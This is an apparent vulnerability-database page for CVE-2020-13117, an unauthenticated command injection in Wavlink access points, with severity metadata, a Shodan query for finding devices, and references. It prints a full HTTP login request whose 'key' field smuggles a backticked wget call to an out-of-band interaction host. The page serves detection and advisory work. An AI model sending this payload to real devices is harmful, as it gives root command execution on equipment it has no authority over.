---
layout: post
cve_id: CVE-2020-13117
title: Wavlink Multiple AP - Remote Command Injection
pcap: true
pcap_path: /pcaps/2020/CVE-2020-13117.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-13117.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741
severity: critical
impact: 'Successful exploitation of this vulnerability could lead to unauthorized
  access, data leakage, and potential compromise of the affected device.

  '
remediation: 'Apply the latest firmware update provided by the vendor to mitigate
  this vulnerability.

  '
reference:
- https://blog.0xlabs.com/2021/02/wavlink-rce-CVE-2020-13117.html
- https://nvd.nist.gov/vuln/detail/CVE-2020-13117
- https://github.com/20142995/sectool
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2020-13117
  cwe-id: CWE-77
  epss-score: 0.93939
  epss-percentile: 0.99872
  cpe: cpe:2.3:h:wavlink:wn575a4:-:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: wavlink
  product: wn575a4
  shodan-query: http.title:"Wi-Fi APP Login"
tags:
- cve
- cve2020
- wavlink
- rce
- oast
- router
- vkev
- vuln
---

## üîç Vulnerability Description
Wavlink products are affected by a vulnerability that may allow remote unauthenticated users to execute arbitrary commands as root on Wavlink devices. The user input is not properly sanitized which allows command injection via the "key" parameter in a login request. It has been tested on Wavlink WN575A4 and WN579X3 devices, but other products may also be affected.

## üåê HTTP Request
```nohighlight
POST /cgi-bin/login.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; rv:140.0.) Gecko/20100101 Firefox/140.0.
Connection: close
Content-Length: 275
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
newUI=1&page=login&username=admin&langChange=0&ipaddr=192.168.1.66&login_page=login.shtml&homepage=main.shtml&sysinitpage=sysinit.shtml&hostname=wifi.wavlink.com&key=%27%3B%60wget+http%3A%2F%2Fd5joh01le0o2tc6stre07tsn79u9wq6cr.oast.pro%3B%60%3B%23&password=asd&lang_select=en
```

